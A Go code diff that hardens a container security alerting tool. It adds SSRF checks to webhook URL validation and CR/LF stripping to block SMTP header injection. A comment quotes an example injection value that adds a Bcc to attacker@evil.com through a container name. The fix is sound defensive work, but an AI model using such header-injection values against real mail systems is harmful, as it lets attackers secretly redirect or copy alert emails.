@@ -5,6 +5,7 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	"net"
 	"net/http"
 	"net/smtp"
 	"net/url"
@@ -22,6 +23,13 @@ var lastNotify = map[string]time.Time{}
 // validateWebhookURL restricts webhook endpoints to http/https URLs without
 // embedded credentials, preventing SSRF via non-HTTP schemes and credential
 // leakage in the URL.
+//
+// 同时拒绝明显非法的目标地址：链路本地（169.254.0.0/16、fe80::/10，含云元数据
+// 169.254.169.254）、未指定地址（0.0.0.0/::）与组播地址——这些绝不是合法的
+// 通知接收端，却是 SSRF 的经典目标。回环与内网（RFC1918）地址保留，以兼容
+// 自托管场景下指向本机/内网服务的 webhook。
+//
+// 已知局限：按字面 IP 判定，DNS 解析到受限地址（DNS rebinding）不在本函数覆盖范围。
 func validateWebhookURL(raw string) error {
 	raw = strings.TrimSpace(raw)
 	if raw == "" {
@@ -39,6 +47,11 @@ func validateWebhookURL(raw string) error {
 	}
 	if u.User != nil {
 		return fmt.Errorf("webhook URL must not contain embedded credentials")
+	}
+	if ip := net.ParseIP(u.Hostname()); ip != nil {
+		if ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() || ip.IsUnspecified() || ip.IsMulticast() {
+			return fmt.Errorf("webhook URL must not target link-local, unspecified or multicast addresses")
+		}
 	}
 	return nil
 }
@@ -170,6 +183,15 @@ func sendWebhookNotification(url string, alert SecurityAlert) error {
 	return nil
 }
 
+// sanitizeMailHeader 移除邮件头字段值中的 CR/LF，防止邮件头注入（SMTP injection）。
+// 攻击者可通过可控字段（如容器名）注入 "\r\nBcc: attacker@evil.com" 篡改收件人。
+// 邮件头字段绝不能包含裸换行，这里一律剥离并折叠为单行。
+func sanitizeMailHeader(v string) string {
+	v = strings.ReplaceAll(v, "\r", "")
+	v = strings.ReplaceAll(v, "\n", " ")
+	return strings.TrimSpace(v)
+}
+
 func sendSMTPNotification(cfg config.NotificationConfig, alert SecurityAlert) error {
 	if cfg.SMTPServer == "" || cfg.SMTPTo == "" {
 		return fmt.Errorf("smtp server/recipient not configured")
@@ -184,12 +206,16 @@ func sendSMTPNotification(cfg config.NotificationConfig, alert SecurityAlert) er
 	}
 	addr := fmt.Sprintf("%s:%d", cfg.SMTPServer, port)
 
-	subject := fmt.Sprintf("[%s] 安全告警: %s - %s", strings.ToUpper(alert.Severity), alert.ContainerName, alert.Type)
+	// 所有进入邮件头的字段必须先剥离 CR/LF（容器名等为用户可控输入）。
+	from = sanitizeMailHeader(from)
+	to := sanitizeMailHeader(cfg.SMTPTo)
+	subject := sanitizeMailHeader(fmt.Sprintf("[%s] 安全告警: %s - %s",
+		strings.ToUpper(alert.Severity), alert.ContainerName, alert.Type))
 	body := fmt.Sprintf(
 		"EyvesCloud 安全告警\n\n容器: %s\n类型: %s\n级别: %s\n来源 IP: %s\n目标 IP: %s\n端口: %d\n详情: %s\n时间: %s\n",
 		alert.ContainerName, alert.Type, alert.Severity, alert.SourceIP, alert.TargetIP, alert.TargetPort, alert.Detail, alert.Timestamp)
 	msg := "From: " + from + "\r\n" +
-		"To: " + cfg.SMTPTo + "\r\n" +
+		"To: " + to + "\r\n" +
 		"Subject: " + subject + "\r\n" +
 		"MIME-Version: 1.0\r\n" +
 		"Content-Type: text/plain; charset=UTF-8\r\n" +
@@ -200,10 +226,11 @@ func sendSMTPNotification(cfg config.NotificationConfig, alert SecurityAlert) er
 		auth = smtp.PlainAuth("", cfg.SMTPUser, cfg.SMTPPassword, cfg.SMTPServer)
 	}
 
+	recipients := splitEmails(to)
 	if port == 465 {
-		return sendSMTPImplicitTLS(cfg.SMTPServer, addr, auth, from, splitEmails(cfg.SMTPTo), []byte(msg))
+		return sendSMTPImplicitTLS(cfg.SMTPServer, addr, auth, from, recipients, []byte(msg))
 	}
-	return smtp.SendMail(addr, auth, from, splitEmails(cfg.SMTPTo), []byte(msg))
+	return smtp.SendMail(addr, auth, from, recipients, []byte(msg))
 }
 
 // sendSMTPImplicitTLS sends mail over an implicit TLS connection (port 465).
